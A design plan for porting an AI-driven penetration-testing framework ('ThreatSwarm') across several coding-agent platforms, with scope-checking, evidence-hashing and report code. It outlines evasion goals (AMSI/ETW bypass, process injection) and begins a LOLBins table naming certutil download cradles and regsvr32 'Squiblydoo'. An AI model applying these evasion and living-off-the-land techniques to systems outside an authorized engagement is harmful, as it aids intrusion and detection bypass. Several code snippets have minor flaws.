# ThreatSwarm Improvement Plan — Multi-Agent Pentesting Framework

**Fork:** vsh00t/ThreatSwarm  
**Base:** mukul975/ThreatSwarm v1.0.0  
**Author:** Ironcybersec (Jorge Moya / @vSh00t)  
**Date:** 2026-04-30  
**Status:** Draft — Pending Review

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Current State Analysis](#2-current-state-analysis)
3. [Architecture Overhaul](#a-architecture-overhaul)
4. [Multi-Agent Adapter Layer](#b-multi-agent-adapter-layer)
5. [Scope Enforcement Improvements](#c-scope-enforcement-improvements)
6. [Evidence System Improvements](#d-evidence-system-improvements)
7. [Agent Quality Improvements](#e-agent-quality-improvements)
8. [New Agents to Add](#f-new-agents-to-add)
9. [Tool Integration](#g-tool-integration)
10. [Report Generation Pipeline](#h-report-generation-pipeline)
11. [Implementation Roadmap](#i-implementation-roadmap)

---

## 1. Executive Summary

ThreatSwarm is a Claude Code plugin with 27 specialist agents, 6 slash commands, 5 skill libraries, and deterministic scope enforcement. It's well-structured but tightly coupled to Claude Code's `.claude/` directory format, `PreToolUse`/`Stop` hooks API, and the `cybersecurity-skills` plugin system.

**Goal:** Transform ThreatSwarm from a Claude Code-only plugin into a **multi-agent pentesting framework** that works identically across Claude Code, GitHub Copilot, OpenCode, and OpenClaw — while making the pentesting methodology and tooling significantly more robust for Ironcybersec's daily operations.

**Key changes:**
- Extract agent logic from Claude-specific format into a platform-agnostic core
- Build an adapter layer for each supported platform
- Improve existing agents with real-world operational depth
- Add 5 new agents covering vulnerability management, purple team, cloud post-ex, network segmentation, and red team infrastructure
- Build an automated report generation pipeline
- Integrate with Ironcybersec's existing tooling (NetExec, n8n, OpenClaw MCPs)

---

## 2. Current State Analysis

### 2.1 What Exists

| Component | Location | Lines | Quality |
|-----------|----------|-------|---------|
| Master context | `CLAUDE.md` | ~250 | Excellent — comprehensive delegation table, OPSEC rules |
| Settings/hooks | `.claude/settings.json` | ~120 | Good — permissions, hook wiring, env vars |
| Scope checker | `.claude/hooks/scope_check.py` | ~230 | Excellent — CIDR awareness, false positive filtering, exit code 2 blocking |
| Findings sync | `.claude/hooks/findings_sync.py` | ~110 | Good — aggregates CRITICAL/HIGH from evidence/ |
| Command logger | `.claude/hooks/cmd_log.sh` | ~30 | Adequate — JSON parsing, timestamp append |
| Agent definitions | `.claude/agents/*.md` (27 files) | 100-468 each | Mixed — some deep (AD: 334, password-attacks: 468), some thin (recon: 141, network-ops: 181) |
| Slash commands | `.claude/commands/*.md` (6 files) | 50-100 each | Good — engage, attack, pwned, hunt, ir, report |
| Rules | `.claude/rules/*.md` (4 files) | 60-100 each | Excellent — evidence handling, loot security, report standards, exploit code |
| Skills | `.claude/skills/*/SKILL.md` (5 dirs) | 200-600 each | Excellent — ad-attacks, exploit-db, mitre-attack, report-templates, wordlists |
| Scripts | `scripts/*.sh`, `scripts/*.py` (3 files) | 50-200 each | Good — batch recon, worktree setup, hook smoke tests |

### 2.2 Claude-Specific Coupling Points

Every one of these needs to be decoupled or adapter-mediated:

| Coupling | Where | Impact |
|----------|-------|--------|
| `.claude/` directory structure | All agents, commands, hooks, rules, skills | Directory layout is Claude Code proprietary |
| `PreToolUse` / `PostToolUse` / `Stop` hooks | `settings.json` → `hooks` key | JSON schema for hook invocation is Claude-specific |
| `tool_name: "Bash"` matcher | `scope_check.py` line: `if tool_name != 'Bash'` | Assumes Claude's tool naming |
| `tool_input.command` extraction | `scope_check.py` and `cmd_log.sh` | Claude-specific JSON payload format |
| `claude: command` skill invocation | Every agent frontmatter | `cybersecurity-skills:*` is a Claude Code skill system |
| `.claude-plugin/plugin.json` manifest | Marketplace distribution | Claude Code plugin format only |
| `allowed-tools` frontmatter key | All agents and commands | Claude Code permission scoping |
| `model: opus/sonnet` frontmatter | Agent definitions | Claude-specific model selection |
| `$ARGUMENTS` variable | Slash commands | Claude Code template variable |
| `Glob(**)` permission syntax | `settings.json` | Claude-specific glob permissions |
| Path-scoped rules (frontmatter `paths`) | `rules/*.md` | Claude Code conditional rule loading |

### 2.3 What's Agent-Agnostic (Reusable As-Is)

| Component | Why It's Portable |
|-----------|-------------------|
| `scope_check.py` core logic | Pure Python, only needs stdin JSON format adaptation |
| `findings_sync.py` | Pure Python, filesystem operations only |
| Evidence directory structure | Standard filesystem, no platform dependency |
| All agent methodology content | Markdown text, no platform-specific instructions |
| Skill libraries (ad-attacks, etc.) | Pure reference material |
| Report templates | Markdown templates |
| CVSS scoring language | Standard framework |
| ATT&CK mapping tables | Standard framework |
| Wordlist references | Standard paths |
| `scope.txt` format | Simple text file |
| `CLAUDE.md` operator rules (non-Claude parts) | Universal OPSEC rules |
| `batch_recon.sh` | Standard bash |
| `worktree_setup.sh` | Standard git |

### 2.4 What's Missing

- No YAML scope support (mentioned in README but not implemented)
- No subnet exhaustion detection in scope checker
- No time-based engagement windows
- No automated screenshot capture pipeline
- No PCAP management
- No hash verification pipeline for evidence integrity
- No HTML/PDF report export
- No multi-platform adapter layer
- No MCP server integration
- No n8n workflow integration
- No project management integration (OpenProject)
- No vulnerability management / remediation tracking
- No purple team / MITRE ATT&CK emulation capability
- No cloud post-exploitation specialization
- No network segmentation testing
- No red team infrastructure automation
- CrackMapExec references instead of NetExec (Jorge maintains vsh00t/NetExec fork)

---

## A. Architecture Overhaul

### A.1 Target Architecture

```
threatswarm/
├── core/                          # Platform-agnostic core
│   ├── agents/                    # Agent methodology (markdown, no frontmatter)
│   │   ├── active-directory.md
│   │   ├── web-attacker.md
│   │   ├── ... (27 existing + 5 new)
│   │   └── _registry.json         # Agent metadata: name, triggers, tools, tags
│   ├── rules/                     # Universal rules (no path-scoped frontmatter)
│   │   ├── evidence.md
│   │   ├── loot.md
│   │   ├── reports.md
│   │   └── exploits.md
│   ├── skills/                    # Reference libraries
│   │   ├── ad-attacks/
│   │   ├── exploit-db/
│   │   ├── mitre-attack/
│   │   ├── report-templates/
│   │   └── wordlists/
│   ├── hooks/                     # Standalone tools (not hook-format dependent)
│   │   ├── scope_check.py         # CLI tool + library
│   │   ├── findings_sync.py
│   │   └── evidence_capture.py    # NEW: screenshot/PCAP/hash pipeline
│   ├── commands/                  # Command definitions (platform-agnostic)
│   │   ├── engage.md
│   │   ├── attack.md
│   │   ├── pwned.md
│   │   ├── hunt.md
│   │   ├── ir.md
│   │   └── report.md
│   ├── scripts/
│   │   ├── batch_recon.sh
│   │   ├── worktree_setup.sh
│   │   ├── report_generate.py     # NEW: automated report pipeline
│   │   └── scope_validate.py      # NEW: scope.yaml + subnet validation
│   ├── templates/                 # Report/client templates
│   │   ├── executive_summary.md
│   │   ├── technical_finding.md
│   │   ├── remediation_roadmap.md
│   │   └── client/
│   │       ├── default/
│   │       └── enterprise/
│   └── schema/                    # JSON schemas for structured data
│       ├── finding.json
│       ├── scope.json
│       ├── evidence.json
│       └── agent_registry.json
│
├── adapters/                      # Per-platform adapters
│   ├── claude-code/               # Claude Code adapter
│   │   ├── .claude/
│   │   │   ├── agents/            # Symlinks or generated files with frontmatter
│   │   │   ├── commands/
│   │   │   ├── rules/
│   │   │   ├── skills/
│   │   │   ├── hooks/
│   │   │   └── settings.json
│   │   ├── .claude-plugin/
│   │   │   └── plugin.json
│   │   └── CLAUDE.md              # Generated from core + platform overlay
│   │
│   ├── github-copilot/            # GitHub Copilot adapter
│   │   ├── .github/
│   │   │   └── copilot-instructions.md
│   │   ├── workspace-rules/       # Copilot workspace rules
│   │   │   ├── evidence.rules.md
│   │   │   ├── loot.rules.md
│   │   │   └── reports.rules.md
│   │   └── setup.sh               # Install adapter into workspace
│   │
│   ├── opencode/                  # OpenCode adapter
│   │   ├── opencode.json          # OpenCode configuration
│   │   ├── instructions.md        # OpenCode system instructions
│   │   └── setup.sh
│   │
│   └── openclaw/                  # OpenClaw (Baphomet) adapter
│       ├── skills/                # SKILL.md files per agent domain
│       │   ├── pentest-recon/SKILL.md
│       │   ├── pentest-web/SKILL.md
│       │   ├── pentest-ad/SKILL.md
│       │   ├── pentest-exploit/SKILL.md
│       │   ├── pentest-postex/SKILL.md
│       │   ├── pentest-report/SKILL.md
│       │   ├── pentest-evasion/SKILL.md
│       │   ├── pentest-c2/SKILL.md
│       │   ├── pentest-mobile/SKILL.md
│       │   ├── pentest-iot/SKILL.md
│       │   ├── pentest-cloud/SKILL.md
│       │   ├── pentest-container/SKILL.md
│       │   ├── pentest-network/SKILL.md
│       │   ├── pentest-osint/SKILL.md
│       │   ├── pentest-wireless/SKILL.md
│       │   ├── pentest-dfir/SKILL.md
│       │   ├── pentest-threat-hunt/SKILL.md
│       │   ├── pentest-purple/SKILL.md     # NEW
│       │   ├── pentest-vuln-mgmt/SKILL.md  # NEW
│       │   └── pentest-red-infra/SKILL.md  # NEW
│       └── setup.sh
│
├── integrations/                  # External tool integrations
│   ├── mcp/                       # MCP server definitions
│   │   ├── scope-mcp/             # Scope validation MCP server
│   │   │   ├── server.py
│   │   │   └── config.json
│   │   ├── evidence-mcp/          # Evidence management MCP server
│   │   │   ├── server.py
│   │   │   └── config.json
│   │   └── report-mcp/            # Report generation MCP server
│   │       ├── server.py
│   │       └── config.json
│   ├── n8n/                       # n8n workflow templates
│   │   ├── engagement-start.json
│   │   ├── finding-sync.json
│   │   └── report-notification.json
│   └── openproject/               # OpenProject task integration
│       ├── engagement-template.json
│       └── sync.py
│
├── scope.txt                      # Default scope file
├── scope.yaml                     # YAML scope (NEW)
├── CLAUDE.md                      # Master context (kept for Claude Code compat)
├── README.md
├── LICENSE
└── IMPROVEMENT_PLAN.md
```

### A.2 Core Principles

1. **Write once, adapt everywhere** — Agent methodology lives in `core/`, never duplicated
2. **Adapters are thin** — Each adapter only handles platform-specific wrapping, not logic
3. **Core is CLI-first** — `scope_check.py` works as both a hook and a standalone tool
4. **Schema-driven** — All structured data uses JSON Schema for validation
5. **No runtime dependencies** — Core Python scripts work with stdlib + `ipaddress`

### A.3 Migration Strategy

Phase 1: Create the `core/` directory and move all agent methodology there, stripping Claude-specific frontmatter. Keep `.claude/` as a symlink-based adapter initially.

Phase 2: Build `adapters/` for each platform with generation scripts.

Phase 3: Add build tooling — a single `make` or `just` command generates all adapter outputs from core.

---

## B. Multi-Agent Adapter Layer

### B.1 Claude Code Adapter (`adapters/claude-code/`)

**Status:** Already works. This is the existing `.claue/` structure.

**Changes needed:**
1. Convert `.claude/agents/*.md` to symlinks pointing to `core/agents/*.md` with generated frontmatter
2. Same for `.claude/commands/`, `.claude/rules/`, `.claude/skills/`
3. Keep `settings.json` as-is (Claude-specific config)
4. Keep `hooks/` directory with Claude-specific wrapper scripts that call `core/hooks/*.py`
5. Update `CLAUDE.md` to reference `core/` paths

**Generated frontmatter example** (from `core/agents/active-directory.md`):
```yaml
---
name: active-directory
description: Active Directory and Windows domain attack specialist. Use for Kerberoasting, AS-REP roasting, DCSync, BloodHound enumeration, ADCS ESC attacks, Golden/Silver Ticket, and domain privilege escalation.
tools: Bash, Read, Write
model: opus
---
```

This gets prepended to the core agent markdown automatically by the build script.

### B.2 GitHub Copilot Adapter (`adapters/github-copilot/`)

GitHub Copilot uses workspace-level instructions for context. There's no agent/sub-agent system — it's a single conversational AI with project context files.

**Files to create:**

#### `.github/copilot-instructions.md`
```markdown
# ThreatSwarm — Multi-Agent Pentesting Framework

You are operating as a penetration testing assistant within the ThreatSwarm framework.

## Core Rules
[Auto-generated from core/rules/evidence.md, loot.md, reports.md, exploits.md]

## Scope Enforcement
Before running ANY network command, verify the target is in scope.txt.
Run: python3 core/hooks/scope_check.py <command> to validate.

## Available Agents
[Auto-generated table from core/agents/_registry.json]

## Engagement Commands
[Auto-generated from core/commands/*.md]

## Tool Paths
[Auto-generated from CLAUDE.md tool table]

## OPSEC Defaults
[Auto-generated from CLAUDE.md]

## Anti-Patterns
[Auto-generated from CLAUDE.md]
```

#### Workspace Rules
Copilot supports workspace rules that are conditionally loaded based on file paths. Map these directly from core rules:

| Core Rule | Copilot Rule File | Trigger Path |
|-----------|-------------------|-------------|
| `core/rules/evidence.md` | `workspace-rules/evidence.rules.md` | `evidence/**` |
| `core/rules/loot.md` | `workspace-rules/loot.rules.md` | `loot/**` |
| `core/rules/reports.md` | `workspace-rules/reports.rules.md` | `reports/**` |
| `core/rules/exploits.md` | `workspace-rules/exploits.rules.md` | `**/*.py`, `**/*.sh` |

**Limitation:** Copilot has no hook system. Scope enforcement must be manual (the agent checks via `scope_check.py --check "command"` before running). The build script generates a reminder in the instructions.

### B.3 OpenCode Adapter (`adapters/opencode/`)

OpenCode is a terminal-based coding agent that supports instruction files and agent configurations.

#### `opencode.json`
```json
{
  "name": "threatswarm",
  "instructions": "adapters/opencode/instructions.md",
  "hooks": {
    "pre-command": "python3 core/hooks/scope_check.py",
    "post-session": "python3 core/hooks/findings_sync.py"
  },
  "agents": [
    {
      "name": "recon",
      "instructions": "core/agents/recon.md",
      "tools": ["bash", "read", "write", "glob"],
      "model": "anthropic/claude-sonnet-4"
    },
    {
      "name": "exploit",
      "instructions": "core/agents/exploit.md",
      "tools": ["bash", "read", "write"],
      "model": "anthropic/claude-opus-4"
    }
  ]
}
```

**Note:** OpenCode's agent system and hook system may differ from the above. This needs validation against the latest OpenCode release. The adapter will be built to match whatever OpenCode supports at implementation time.

#### `instructions.md`
Auto-generated from `CLAUDE.md` with Claude-specific references replaced:
- `claude` → `opencode`
- Skill invocation syntax adjusted
- Hook format adjusted

### B.4 OpenClaw Adapter (`adapters/openclaw/`)

OpenClaw uses the SKILL.md format for agent capabilities. Each "agent" becomes a skill that Baphomet can invoke.

#### Skill Structure
Each skill follows the OpenClaw SKILL.md pattern:
```markdown
# pentest-web — Web Application Penetration Testing

## Description
Web application penetration testing specialist. SQLi, XSS, SSRF, LFI, IDOR, JWT attacks, OWASP Top 10.

## Triggers
- web pentest, web app testing, SQL injection, XSS, SSRF, web security

## Instructions
[Core methodology from core/agents/web-attacker.md — full content]

## Scope Check
Before ANY network command, verify the target is in scope.txt:
```bash
python3 core/hooks/scope_check.py --check "nmap $TARGET"
```

## Evidence
All output goes to: evidence/$(date +%Y%mdd)/$TARGET/{web,screenshots}/
```

#### Consolidated Skills (not 1:1 with agents)
OpenClaw skills should be broader than individual agents to avoid skill proliferation:

| OpenClaw Skill | Combines Agents | Core Files |
|---------------|-----------------|------------|
| `pentest-recon` | recon + osint | recon.md, osint.md |
| `pentest-web` | web-attacker + api-attacker | web-attacker.md, api-attacker.md |
| `pentest-ad` | active-directory | active-directory.md |
| `pentest-exploit` | exploit + vuln-researcher | exploit.md, vuln-researcher.md |
| `pentest-postex` | post-ex + password-attacks + evasion | post-ex.md, password-attacks.md, evasion.md |
| `pentest-c2` | c2-operator + social-engineer | c2-operator.md, social-engineer.md |
| `pentest-report` | report-writer | report-writer.md |
| `pentest-mobile` | mobile-attacker | mobile-attacker.md |
| `pentest-iot` | iot-attacker | iot-attacker.md |
| `pentest-cloud` | cloud-attacker + container-attacker | cloud-attacker.md, container-attacker.md |
| `pentest-network` | network-ops + wireless-attacker | network-ops.md, wireless-attacker.md |
| `pentest-dfir` | dfir + log-analyst + threat-hunter | dfir.md, log-analyst.md, threat-hunter.md |
| `pentest-purple` | (NEW) purple-team | purple-team.md |
| `pentest-vuln-mgmt` | (NEW) vuln-management + compliance-scanner | vuln-management.md, compliance-scanner.md |
| `pentest-red-infra` | (NEW) red-infra + crypto-attacker | red-infra.md, crypto-attacker.md |

#### MCP Integration
The OpenClaw adapter includes MCP server definitions for `mcporter`:

```json
{
  "name": "threatswarm-scope",
  "command": "uvx",
  "args": ["--from", "threatswarm", "threatswarm-mcp-scope"],
  "env": {
    "SCOPE_FILE": "./scope.txt"
  }
}
```

This allows any OpenClaw agent to call `threatswarm_scope_check(command="nmap 10.10.10.5")` as a tool.

### B.5 Build System

A `build.py` script (or `Makefile`) generates all adapter outputs:

```bash
# Build all adapters
python3 build.py --all

# Build specific adapter
python3 build.py --adapter claude-code
python3 build.py --adapter github-copilot
python3 build.py --adapter opencode
python3 build.py --adapter openclaw

# Validate generated output
python3 build.py --validate

# Watch for changes and rebuild
python3 build.py --watch
```

The build script:
1. Reads `core/agents/*.md` and generates platform-specific frontmatter
2. Reads `core/rules/*.md` and generates path-scoped rule files
3. Reads `core/commands/*.md` and generates platform command files
4. Reads `CLAUDE.md` and generates platform-specific master context
5. Validates all generated files against platform schemas

---

## C. Scope Enforcement Improvements

### C.1 Standalone CLI Mode

Current `scope_check.py` reads JSON from stdin (Claude hook format). Add a standalone CLI mode:

```python
# New CLI interface
def main():
    import argparse
    parser = argparse.ArgumentParser(description='ThreatSwarm scope checker')
    subparsers = parser.add_subparsers(dest='mode')

    # Hook mode (existing behavior)
    subparsers.add_parser('hook', help='Claude Code hook mode (stdin JSON)')

    # CLI check mode
    check = subparsers.add_parser('check', help='Check if a command is in scope')
    check.add_argument('command', help='Command to validate')
    check.add_argument('--scope-file', default='./scope.txt')
    check.add_argument('--json', action='store_true', help='JSON output')

    # List mode
    lst = subparsers.add_parser('list', help='List all scope entries')
    lst.add_argument('--scope-file', default='./scope.txt')
    lst.add_argument('--yaml', action='store_true', help='Also load scope.yaml')

    # Validate mode (check scope file integrity)
    validate = subparsers.add_parser('validate', help='Validate scope file')
    validate.add_argument('--scope-file', default='./scope.txt')
    validate.add_argument('--scope-yaml', default='./scope.yaml')

    # Add/remove targets
    add = subparsers.add_parser('add', help='Add target to scope')
    add.add_argument('target', help='IP, CIDR, or domain to add')
    add.add_argument('--scope-file', default='./scope.txt')

    args = parser.parse_args()

    if args.mode == 'hook':
        # Existing stdin JSON logic
        hook_mode()
    elif args.mode == 'check':
        check_mode(args)
    elif args.mode == 'list':
        list_mode(args)
    elif args.mode == 'validate':
        validate_mode(args)
    elif args.mode == 'add':
        add_mode(args)
```

**Usage:**
```bash
# Standalone check (for manual use or other platforms)
python3 core/hooks/scope_check.py check "nmap 10.10.10.5"
# Output: ✓ IN SCOPE: 10.10.10.5 matches 10.10.10.0/24

python3 core/hooks/scope_check.py check "nmap 8.8.8.8"
# Output: ✗ SCOPE VIOLATION: 8.8.8.8 not in scope.txt
# Exit code: 1

# JSON output (for MCP server consumption)
python3 core/hooks/scope_check.py check "nmap 10.10.10.5" --json
# {"in_scope": true, "target": "10.10.10.5", "match": "10.10.10.0/24", "kind": "network"}

# Hook mode (existing, for Claude Code)
echo '{"tool_name":"Bash","tool_input":{"command":"nmap 10.10.10.5"}}' | python3 core/hooks/scope_check.py hook
```

### C.2 YAML Scope Support

Implement `scope.yaml` as described in the README but never actually built:

```python
# scope_yaml.py — Load and validate YAML scope files
import yaml
from pathlib import Path
from datetime import datetime, timezone
from typing import List, Tuple

def load_scope_yaml(path: str) -> dict:
    """Load scope.yaml and return structured scope data."""
    with open(path) as f:
        data = yaml.safe_load(f)
    
    scope = {
        'in_scope': [],
        'out_of_scope': [],
        'engagement': {},
    }
    
    for entry in data.get('targets', {}).get('in_scope', []):
        entry_type = entry.get('type', 'ip')
        value = entry['value']
        note = entry.get('note', '')
        
        if entry_type == 'cidr':
            scope['in_scope'].append(('network', ipaddress.ip_network(value, strict=False), note))
        elif entry_type == 'domain':
            scope['in_scope'].append(('domain', value.lower(), note))
        elif entry_type == 'ip':
            addr = ipaddress.ip_address(value)
            scope['in_scope'].append(('network', ipaddress.ip_network(f"{addr}/32", strict=False), note))
        elif entry_type == 'url':
            scope['in_scope'].append(('url', value, note))
        elif entry_type == 'port_range':
            scope['in_scope'].append(('port_range', value, note))
    
    for entry in data.get('targets', {}).get('out_of_scope', []):
        scope['out_of_scope'].append(entry)
    
    if 'engagement' in data:
        scope['engagement'] = data['engagement']
        # Validate engagement window if present
        if 'start_date' in data['engagement'] and 'end_date' in data['engagement']:
            start = datetime.fromisoformat(data['engagement']['start_date'])
            end = datetime.fromisoformat(data['engagement']['end_date'])
            now = datetime.now(timezone.utc)
            if now < start or now > end:
                print(f"[SCOPE WARNING] Engagement window: {start} to {end}. Current time: {now}")
    
    return scope
```

**Scope YAML Schema** (`core/schema/scope.json`):
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "required": ["targets"],
  "properties": {
    "targets": {
      "type": "object",
      "required": ["in_scope"],
      "properties": {
        "in_scope": {
          "type": "array",
          "items": {
            "type": "object",
            "required": ["type", "value"],
            "properties": {
              "type": { "enum": ["ip", "cidr", "domain", "url", "port_range"] },
              "value": { "type": "string" },
              "note": { "type": "string" }
            }
          }
        },
        "out_of_scope": {
          "type": "array",
          "items": { "type": "string" }
        }
      }
    },
    "engagement": {
      "type": "object",
      "properties": {
        "type": { "enum": ["blackbox", "whitebox", "graybox"] },
        "authorized_by": { "type": "string" },
        "authorization_date": { "type": "string", "format": "date" },
        "start_date": { "type": "string", "format": "date-time" },
        "end_date": { "type": "string", "format": "date-time" },
        "rules_of_engagement": { "type": "string" }
      }
    }
  }
}
```

### C.3 Subnet Exhaustion Detection

Prevent accidental scanning of entire /8 or /16 ranges:

```python
def check_subnet_exhaustion(target: str, scope_entries: list) -> tuple:
    """
    Warn if a scan would cover too many hosts.
    Returns (is_warning, host_count, message).
    """
    MAX_HOSTS_DEFAULT = 1024  # Warn above /22
    
    try:
        network = ipaddress.ip_network(target, strict=False)
        host_count = network.num_addresses
        if network.prefixlen <= 24:  # /24 or larger
            return True, host_count, (
                f"WARN: {target} contains {host_count} hosts. "
                f"Confirm authorization before scanning large subnets."
            )
    except ValueError:
        pass
    return False, 0, ""
```

### C.4 Time-Based Engagement Windows

```python
def check_engagement_window(scope_data: dict) -> tuple:
    """Check if current time is within authorized engagement window."""
    engagement = scope_data.get('engagement', {})
    
    if 'start_date' not in engagement or 'end_date' not in engagement:
        return True, "No time restrictions"
    
    start = datetime.fromisoformat(engagement['start_date'])
    end = datetime.fromisoformat(engagement['end_date'])
    now = datetime.now(timezone.utc)
    
    if now < start:
        return False, f"Engagement starts at {start} (current: {now})"
    if now > end:
        return False, f"Engagement ended at {end} (current: {now})"
    
    # Check business hours restriction if specified
    if 'business_hours_only' in engagement and engagement['business_hours_only']:
        # Default: Mon-Fri 08:00-18:00 UTC
        if now.weekday() >= 5:  # Weekend
            return False, f"Business hours only (current: {now.strftime('%A')})"
        if not (8 <= now.hour < 18):
            return False, f"Business hours 08:00-18:00 UTC (current: {now.strftime('%H:%M')} UTC)"
    
    return True, "Within engagement window"
```

### C.5 Hook Wrapper for Non-Claude Platforms

```python
# adapters/*/hooks/scope_check_wrapper.py
"""
Wrapper that translates platform-specific hook format to scope_check.py input.
Used by GitHub Copilot (manual check) and OpenCode (pre-command hook).
"""
import subprocess, sys, json

def check_command(command: str, scope_file: str = './scope.txt'):
    """Run scope_check.py in standalone mode."""
    result = subprocess.run(
        ['python3', 'core/hooks/scope_check.py', 'check', command, 
         '--scope-file', scope_file, '--json'],
        capture_output=True, text=True
    )
    return json.loads(result.stdout) if result.returncode == 0 else None

# For platforms with pre-command hooks:
if __name__ == '__main__':
    # Read command from platform-specific format and validate
    command = sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()
    result = check_command(command)
    if result and not result.get('in_scope', False):
        print(f"BLOCKED: {result.get('target')} not in scope", file=sys.stderr)
        sys.exit(2)
```

---

## D. Evidence System Improvements

### D.1 Automated Screenshot Capture

Create `core/hooks/evidence_capture.py` — a post-command hook that automatically captures screenshots after successful exploits:

```python
#!/usr/bin/env python3
"""
Evidence capture utility — screenshots, PCAP management, hash verification.
"""

def capture_screenshot(target: str, evidence_dir: str, tool: str = "scrot") -> str:
    """Capture a screenshot of the current display."""
    from datetime import datetime, timezone
    from pathlib import Path
    import subprocess
    
    ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
    outdir = Path(evidence_dir) / "screenshots"
    outdir.mkdir(parents=True, exist_ok=True)
    
    filepath = outdir / f"{target}_{tool}_{ts}.png"
    
    # Try scrot (Linux), screencapture (macOS), or tool-specific capture
    if tool == "scrot":
        subprocess.run(["scrot", "-z", str(filepath)], check=False)
    elif tool == "screencapture":
        subprocess.run(["screencapture", "-x", str(filepath)], check=False)
    
    if filepath.exists():
        # Generate SHA256 hash
        sha256 = hashlib.sha256(filepath.read_bytes()).hexdigest()
        # Write hash to manifest
        append_to_manifest(filepath, sha256, "screenshot", target)
        return str(filepath)
    return None


def manage_pcap(evidence_dir: str, max_size_mb: int = 500) -> dict:
    """
    Manage PCAP files: check sizes, rotate if needed, generate hashes.
    Returns summary of PCAP files and their hashes.
    """
    from pathlib import Path
    import hashlib
    
    evidence_path = Path(evidence_dir)
    pcaps = list(evidence_path.rglob("*.pcap")) + list(evidence_path.rglob("*.pcapng"))
    
    summary = {}
    for pcap in pcaps:
        size_mb = pcap.stat().st_size / (1024 * 1024)
        sha256 = hashlib.sha256(pcap.read_bytes()).hexdigest()
        summary[str(pcap)] = {
            "size_mb": round(size_mb, 2),
            "sha256": sha256,
            "needs_rotation": size_mb > max_size_mb
        }
    
    return summary


def verify_evidence_chain(evidence_dir: str) -> dict:
    """
    Verify evidence integrity by checking SHA256 hashes against manifest.
    Returns list of verified and tampered files.
    """
    from pathlib import Path
    import hashlib, json
    
    manifest_path = Path(evidence_dir) / "evidence_manifest.json"
    if not manifest_path.exists():
        return {"status": "no_manifest", "message": "No evidence manifest found"}
    
    manifest = json.loads(manifest_path.read_text())
    results = {"verified": [], "tampered": [], "missing": []}
    
    for entry in manifest.get("files", []):
        filepath = Path(entry["path"])
        if not filepath.exists():
            results["missing"].append(entry)
            continue
        
        actual_hash = hashlib.sha256(filepath.read_bytes()).hexdigest()
        if actual_hash == entry["sha256"]:
            results["verified"].append(entry)
        else:
            results["tampered"].append({
                **entry,
                "expected_sha256": entry["sha256"],
                "actual_sha256": actual_hash
            })
    
    return results


def append_to_manifest(filepath: str, sha256: str, evidence_type: str, target: str):
    """Append an evidence entry to the manifest."""
    from pathlib import Path
    import json
    from datetime import datetime, timezone
    
    manifest_path = Path(filepath).parent.parent / "evidence_manifest.json"
    
    if manifest_path.exists():
        manifest = json.loads(manifest_path.read_text())
    else:
        manifest = {"created": datetime.now(timezone.utc).isoformat(), "files": []}
    
    manifest["files"].append({
        "path": str(filepath),
        "sha256": sha256,
        "type": evidence_type,
        "target": target,
        "collected": datetime.now(timezone.utc).isoformat(),
        "operator": get_operator()
    })
    
    manifest_path.write_text(json.dumps(manifest, indent=2))
```

### D.2 Evidence Manifest Format

```json
{
  "created": "2026-04-30T04:18:00Z",
  "engagement": "acme-external",
  "operator": "jorge",
  "files": [
    {
      "path": "evidence/20260430/10.10.10.5/nmap/tcp_full.nmap",
      "sha256": "abc123...",
      "type": "scan_output",
      "target": "10.10.10.5",
      "collected": "2026-04-30T04:20:00Z",
      "operator": "jorge",
      "tool": "nmap",
      "command": "nmap -sS -T3 -p- 10.10.10.5"
    },
    {
      "path": "evidence/20260430/10.10.10.5/screenshots/exploit_success_20260430_042500.png",
      "sha256": "def456...",
      "type": "screenshot",
      "target": "10.10.10.5",
      "collected": "2026-04-30T04:25:00Z",
      "operator": "jorge",
      "tool": "scrot"
    }
  ]
}
```

### D.3 Hash Verification Pipeline

Add to `cmd_log.sh` — after every command that produces output files, automatically hash them:

```bash
#!/usr/bin/env bash
# PostToolUse hook enhancement: auto-hash output files
# ... existing command logging ...

# Auto-hash any new files in evidence/ created in the last 10 seconds
find "$EVIDENCE_DIR" -type f -newermt "10 seconds ago" -not -name "*.log" 2>/dev/null | while read -r file; do
    sha256=$(sha256sum "$file" | awk '{print $1}')
    echo "[$TIMESTAMP] HASH $sha256 $file" >> "$EVIDENCE_DIR/evidence_hashes.log"
done
```

### D.4 Evidence Export Formats

Create `core/scripts/evidence_export.py`:

```python
#!/usr/bin/env python3
"""Export evidence directory to various formats."""

def export_to_html(evidence_dir: str, output_path: str, template: str = "default"):
    """Export evidence to HTML with embedded screenshots."""
    # Walk evidence/ directory
    # Generate HTML with navigation, screenshots, command logs
    # Use Jinja2 template or built-in HTML generation
    pass

def export_to_pdf(evidence_dir: str, output_path: str):
    """Export evidence to PDF (requires wkhtmltopdf or weasyprint)."""
    # Generate HTML first, then convert
    html = export_to_html(evidence_dir, "/tmp/evidence_export.html")
    subprocess.run(["wkhtmltopdf", "--enable-local-file-access", 
                    "/tmp/evidence_export.html", output_path])

def export_to_zip(evidence_dir: str, output_path: str, client_name: str):
    """Package evidence into encrypted ZIP for client delivery."""
    import zipfile
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(evidence_dir):
            for file in files:
                filepath = os.path.join(root, file)
                # Skip sensitive files (loot/)
                if 'loot/' in filepath:
                    continue
                arcname = os.path.relpath(filepath, evidence_dir)
                zf.write(filepath, arcname)
    # Encrypt with GPG
    subprocess.run(["gpg", "--symmetric", "--cipher-algo", "AES256", output_path])
```

---

## E. Agent Quality Improvements

### E.1 Evasion Agent — Major Overhaul

**Current problems:**
- Only covers AMSI bypass (3 basic techniques), basic PowerShell obfuscation, simple XOR shellcode encoding
- LOLBins section is a flat list without categorization or prioritization
- Sandbox detection is rudimentary (CPU count, RAM, uptime)
- Process injection is "conceptual overview" only — no actionable methodology
- Missing: ETW patching, .NET assembly loading, COM hijacking, token manipulation, syscall stomping
- No detection engineering guidance (the stated deliverable)

**Improvements needed:**

#### 1. LOLBins Catalog (Living Off the Land)
```
## LOLBins Catalog — Prioritized by Detection Rate

### Tier 1: Commonly Detected (high alert rate)
| Binary | Technique | ATT&CK | Detection Rate | Use Case |
|--------|-----------|--------|---------------|----------|
| certutil.exe | T1105 Download | High | Download cradles |
| bitsadmin.exe | T1105 Download | High | Background downloads |
| mshta.exe | T1218.005 HTA | High | Execute HTA payloads |
| regsvr32.exe | T1218.010 DLL | High | Squiblydoo DLL loading |
